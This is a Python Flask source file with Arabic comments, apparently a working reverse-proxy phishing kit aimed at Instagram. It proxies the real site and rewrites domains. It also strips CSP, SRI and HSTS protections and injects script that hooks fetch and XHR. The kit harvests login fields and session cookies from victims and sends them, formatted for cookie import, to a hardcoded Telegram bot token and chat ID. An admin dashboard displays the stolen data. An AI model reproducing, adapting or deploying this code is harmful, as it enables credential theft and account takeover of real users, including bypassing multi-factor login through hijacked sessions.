import os
import re
import json
import logging
import urllib3
import yaml
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin, urlparse

import requests
from flask import (
    Flask, request, render_template, make_response,
    redirect, url_for, after_this_request
)

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================== إعدادات التيليجرام ========================
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
# ====================================================================

app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(32).hex()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# قواعد البيانات المؤقتة
captured_sessions = {}
captured_creds = {}

# ======================== تحميل قوالب YAML ========================
class PhishletLoader:
    def __init__(self, phishlets_dir='phishlets'):
        self.phishlets_dir = Path(phishlets_dir)
        self.phishlets = {}
        self._load_all()

    def _load_all(self):
        if not self.phishlets_dir.exists():
            logging.warning(f"⚠️ Phishlets directory '{self.phishlets_dir}' not found. Creating empty directory.")
            self.phishlets_dir.mkdir(exist_ok=True)
            return
        for yaml_file in self.phishlets_dir.glob('*.yaml'):
            try:
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'name' in data:
                        name = data['name']
                        self.phishlets[name] = data
                        logging.info(f"✅ Loaded phishlet: {name} from {yaml_file.name}")
                    else:
                        logging.error(f"❌ Invalid phishlet file (missing 'name'): {yaml_file.name}")
            except Exception as e:
                logging.error(f"❌ Error loading {yaml_file.name}: {e}")

    def get_phishlet(self, name):
        return self.phishlets.get(name)

    def detect_phishlet(self, host):
        for name, data in self.phishlets.items():
            target = data.get('target_domain', '')
            if target and (target in host or name.lower() in host.lower()):
                return data
        if self.phishlets:
            first = next(iter(self.phishlets.values()))
            logging.info(f"ℹ️ No matching phishlet for host '{host}', using default: {first.get('name')}")
            return first
        return None

loader = PhishletLoader()

# ======================== محرك المعالجة ========================
class PhishletEngine:
    def __init__(self, phishlet_config):
        self.config = phishlet_config
        self.name = phishlet_config.get('name', 'Unknown')
        self.target_domain = phishlet_config.get('target_domain', '')
        self.proxy_hosts = phishlet_config.get('proxy_hosts', [])
        self.auth_tokens = phishlet_config.get('auth_tokens', [])
        self.creds_fields = phishlet_config.get('creds_fields', [])
        self.auth_urls = phishlet_config.get('auth_urls', [])
        self.js_inject = phishlet_config.get('js_inject', '')
        self.sub_filters = phishlet_config.get('sub_filters', [])
        self.force_post = phishlet_config.get('force_post', False)

    def send_to_telegram(self, message):
        try:
            max_len = 4000
            for i in range(0, len(message), max_len):
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                payload = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': message[i:i+max_len],
                    'parse_mode': 'HTML'
                }
                requests.post(url, json=payload, timeout=10)
        except Exception as e:
            logging.error(f"Telegram error: {e}")

    def notify_visit(self, ip, ua):
        msg = (f"👀 <b>New Visitor</b>\n"
               f"🌐 <b>IP:</b> <code>{ip}</code>\n"
               f"📱 <b>UA:</b> <code>{ua[:100]}</code>")
        self.send_to_telegram(msg)

    def capture_creds(self, form_data):
        logging.info(f"📥 Raw form data: {form_data}")
        found = {}
        for field in self.creds_fields:
            if field in form_data:
                found[field] = form_data[field]
        for key, value in form_data.items():
            key_lower = key.lower()
            if any(k in key_lower for k in ['user', 'login', 'email', 'phone', 'pass', 'pwd', 'password', 'enc_password']):
                found[key] = value
        if found:
            cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
            captured_creds[cred_id] = {
                'site': self.name,
                'credentials': found,
                'timestamp': str(datetime.now()),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            msg = (f"🔐 <b>New Credentials Captured</b>\n"
                   f"🎯 <b>Target:</b> {self.name}\n"
                   f"🆔 <b>ID:</b> <code>{cred_id}</code>\n"
                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                   f"📋 <b>Data:</b>\n<pre>{json.dumps(found, indent=2, ensure_ascii=False)}</pre>")
            self.send_to_telegram(msg)
            logging.info(f"✅ Credentials captured: {found}")
        return found

    def send_cookies_as_edit_this_cookie(self, cookies_dict, current_host, username="Unknown"):
        cookie_json = []
        domain = f".{self.target_domain.split('.')[-2]}.{self.target_domain.split('.')[-1]}"
        for name, value in cookies_dict.items():
            cookie_json.append({
                "domain": domain,
                "name": name, "value": value,
                "path": "/", "secure": True, "httpOnly": True, "sameSite": "Lax"
            })
        formatted_json = json.dumps(cookie_json, indent=2, ensure_ascii=False)
        msg = (f"🔥 <b>Session Ready to Import (EditThisCookie)</b>\n"
               f"🎯 <b>Target:</b> {self.name}\n"
               f"👤 <b>User:</b> {username}\n"
               f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
               f"<b>📋 Import this JSON into EditThisCookie:</b>\n"
               f"<pre>{formatted_json}</pre>\n"
               f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard")
        self.send_to_telegram(msg)

    def capture_full_session(self, cookies_jar, current_host, creds_data=None):
        cookies_dict = requests.utils.dict_from_cookiejar(cookies_jar) if hasattr(cookies_jar, 'get_dict') else {}
        if not cookies_dict:
            for cookie in cookies_jar:
                cookies_dict[cookie.name] = cookie.value
        has_auth = any(k in cookies_dict for k in self.auth_tokens)
        if cookies_dict and has_auth:
            session_id = datetime.now().strftime("%y%m%d_%H%M%S")
            captured_sessions[session_id] = {
                'site': self.name,
                'cookies': cookies_dict,
                'timestamp': str(datetime.now()),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            logging.info(f"✅ Session {session_id} stored locally with {len(cookies_dict)} cookies")
            username = "Unknown"
            if creds_data:
                for key in ['username', 'email', 'phone', 'login']:
                    if key in creds_data:
                        username = creds_data[key]
                        break
            self.send_cookies_as_edit_this_cookie(cookies_dict, current_host, username)
            return session_id
        return None

    # ======================== دالة إعادة الكتابة المتطورة (مدمجة مع التحسينات) ========================
    def rewrite_content(self, content, content_type, current_host):
        if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
            return content
        try:
            if isinstance(content, bytes):
                content = content.decode('utf-8', errors='ignore')
            
            # قائمة موسعة بالنطاقات (من الكود الجديد)
            all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
            # استبدال شامل لكل النطاقات
            for domain in all_domains:
                # https://any.sub.domain
                content = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{current_host}', content)
                # //any.sub.domain
                content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'//{current_host}', content)
                # داخل علامات الاقتباس (لـ JSON/JS)
                content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}(["''])', rf'\1{current_host}\2', content)
                # استبدال النقاط المهربة (مهم في بعض ملفات JS)
                content = content.replace(domain.replace('.', r'\.'), current_host.replace('.', r'\.'))

            # إزالة integrity لمنع SRI
            content = re.sub(r'integrity="[^"]+"', '', content)
            # إزالة CSP من meta tags
            content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
            # إخفاء رأس CSP في النص
            content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')

            # حقن سكريبت متطور لاعتراض طلبات XMLHttpRequest (من الكود الجديد)
            if '<head>' in content:
                script = f"""<script>
                (function() {{
                    const currentHost = '{current_host}';
                    const domains = {json.dumps(all_domains)};
                    const fixUrl = (url) => {{
                        if (typeof url !== 'string') return url;
                        domains.forEach(d => url = url.replace(new RegExp('https?://([a-zA-Z0-9-]+\.)*' + d.replace(/\./g, '\\.'), 'g'), 'https://' + currentHost));
                        return url;
                    }};
                    // اعتراض XMLHttpRequest
                    const orgOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {{
                        arguments[1] = fixUrl(url);
                        return orgOpen.apply(this, arguments);
                    }};
                    // اعتراض fetch
                    const orgFetch = window.fetch;
                    window.fetch = function(url, options) {{
                        url = fixUrl(url);
                        return orgFetch.call(this, url, options);
                    }};
                }})();
                </script>"""
                content = content.replace('<head>', f'<head>{script}')
            
            # حقن JavaScript المخصص من ملف YAML إذا وجد
            elif self.js_inject and '<head>' in content:
                injection = f"<script>{self.js_inject}</script>"
                content = content.replace('<head>', f'<head>{injection}')

            return content.encode('utf-8')
        except Exception as e:
            logging.error(f"Rewrite error: {e}")
            return content

# ======================== إشعار الزيارة ========================
@app.before_request
def check_visit():
    if request.path == '/' and 'visited' not in request.cookies:
        phishlet_config = loader.detect_phishlet(request.host)
        if phishlet_config:
            engine = PhishletEngine(phishlet_config)
            engine.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
        @after_this_request
        def set_visit_cookie(response):
            response.set_cookie('visited', '1', max_age=3600)
            return response

# ======================== المسارات الإدارية ========================
@app.route('/admin/dashboard')
def admin_dashboard():
    try:
        return render_template('dashboard.html', sessions=captured_sessions, creds=captured_creds, bot_username='Amrsavebot')
    except Exception as e:
        logging.error(f"Dashboard error: {e}")
        return f"Dashboard Error: {str(e)}", 500

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    if session_id in captured_sessions:
        return make_response(
            json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False),
            200,
            {'Content-Type': 'application/json; charset=utf-8'}
        )
    return "Session not found", 404

@app.route('/admin/cred/<cred_id>')
def get_cred(cred_id):
    if cred_id in captured_creds:
        return make_response(
            json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False),
            200,
            {'Content-Type': 'application/json; charset=utf-8'}
        )
    return "Credential not found", 404

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    captured_creds.clear()
    return redirect(url_for('admin_dashboard'))

# ======================== الوكيل العكسي الرئيسي ========================
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    host = request.headers.get('Host', '').split(':')[0]
    phishlet_config = loader.detect_phishlet(host)
    if not phishlet_config:
        return "No phishlet configured for this host", 404
    engine = PhishletEngine(phishlet_config)

    # بناء URL الهدف
    base_url = f"https://{engine.target_domain}"
    target_url = urljoin(base_url, path)
    if request.query_string:
        target_url += '?' + request.query_string.decode('utf-8')

    # تجهيز الرؤوس مع تعطيل الضغط (تحسين من الكود الجديد)
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
    headers['Host'] = engine.target_domain
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    headers['Accept-Encoding'] = 'identity'  # تعطيل الضغط لضمان إعادة الكتابة الصحيحة
    headers['Referer'] = f"https://{engine.target_domain}/"
    headers['Origin'] = f"https://{engine.target_domain}"

    # التقاط بيانات POST
    captured_creds_data = None
    if request.method == 'POST' and request.form:
        captured_creds_data = engine.capture_creds(request.form.to_dict())

    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            cookies=request.cookies,
            data=request.get_data(),
            allow_redirects=False,
            verify=False,
            timeout=30
        )

        # معالجة التوجيهات
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if location:
                new_location = location
                all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
                for domain in all_domains:
                    if domain in new_location:
                        new_location = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{host}', new_location)
                        break
                proxy_resp = make_response('', resp.status_code)
                proxy_resp.headers['Location'] = new_location
                if resp.cookies:
                    engine.capture_full_session(resp.cookies, host, captured_creds_data)
                for cookie_name, cookie_value in resp.cookies.items():
                    proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
                return proxy_resp

        # معالجة المحتوى العادي
        content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
        proxy_resp = make_response(content)
        proxy_resp.status_code = resp.status_code

        # نسخ الرؤوس مع استبعاد الرؤوس الضارة
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
                            'strict-transport-security', 'content-security-policy', 'x-frame-options']
        for n, v in resp.headers.items():
            if n.lower() not in excluded_headers:
                proxy_resp.headers[n] = v

        # نقل الكوكيز
        for cookie_name, cookie_value in resp.cookies.items():
            proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')

        if resp.cookies:
            engine.capture_full_session(resp.cookies, host, captured_creds_data)

        return proxy_resp

    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Service Unavailable", 503

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
